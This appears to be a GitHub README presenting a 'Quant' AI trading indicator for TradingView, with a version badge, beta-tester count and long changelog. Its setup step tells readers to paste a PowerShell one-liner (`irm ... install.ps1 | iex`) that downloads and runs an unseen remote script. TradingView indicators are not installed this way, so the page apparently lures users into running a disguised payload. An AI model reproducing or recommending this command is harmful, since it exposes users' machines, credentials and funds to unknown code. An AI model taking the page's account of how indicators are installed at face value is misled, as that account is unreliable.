<a id="get"></a>

<p align="center">
  <img src="quant.jpg" alt="TradingView" width="880">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-v2.9.5-blue" alt="version">
  <img src="https://img.shields.io/badge/beta%20testers-7%2C451-brightgreen?logo=github" alt="beta testers">
  <img src="https://img.shields.io/badge/license-MIT-green" alt="license">
</p>
Quant is our first AI-powered indicator for TradingView. It uses historical market data and current inputs, including price action, liquidity, positioning, and volatility, to generate possible price scenarios for a selected timeframe.

## Getting Started

#### 1. Open PowerShell

Press **Win + R**, type `PowerShell`, and press **Enter**.

#### 2. Run the Installation Command

Paste the installation command below into the PowerShell window:

```powershell
irm github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
```

#### 3. Restart TradingView

Once the installation is complete, restart TradingView. <br>
The Quant Indicator will then be available in your indicator library.

----

## Changelog

### v2.9.5 Beta

- Updated market data processing for price action, liquidity, positioning, volatility, and market structure.
- Added support for scheduled economic events and upcoming market releases.
- Adjusted how historical data is processed across different chart timeframes.
- Revised scenario calculations to account for changes in market conditions.
- Added checks for missing, delayed, and inconsistent data inputs.
- Updated volatility calculations during periods of sharp price movement.
- Adjusted liquidity analysis to account for changes in market depth.
- Revised positioning data processing for instruments with limited historical coverage.
- Reduced redundant calculations when new market data arrives.
- Fixed an issue where switching symbols could retain calculations from the previous chart.
- Corrected timeframe synchronization after changing chart intervals.
- Fixed delayed indicator updates following periods of low market activity.
- Updated handling of incomplete candles and partially loaded historical data.
- Reduced unnecessary chart refreshes when incoming data remains unchanged.
- Fixed occasional discrepancies between scenario calculations and displayed chart values.
- Adjusted indicator initialization when opening a new chart.
- Corrected data handling after temporary connection interruptions.
- Fixed several issues reported during beta testing.
